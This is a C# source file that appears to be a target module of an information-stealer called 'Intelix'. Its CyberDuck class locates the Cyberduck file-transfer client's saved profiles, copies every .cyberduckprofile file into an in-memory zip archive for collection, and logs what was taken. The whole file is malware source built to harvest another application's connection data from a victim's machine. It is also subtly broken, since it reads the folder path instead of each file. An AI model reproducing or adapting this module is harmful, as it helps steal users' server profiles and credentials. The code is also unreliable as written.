using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications;

public class CyberDuck : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "CyberDuck";
		string[] files = Directory.GetFiles(path);
		foreach (string text in files)
		{
			if (text.EndsWith(".cyberduckprofile"))
			{
				string text2 = "CyberDuck\\" + Path.GetFileName(text);
				zip.AddFile(text2, File.ReadAllBytes(path));
				counterApplications.Files.Add(text + " => " + text2);
			}
		}
		counter.Applications.Add(counterApplications);
	}
}
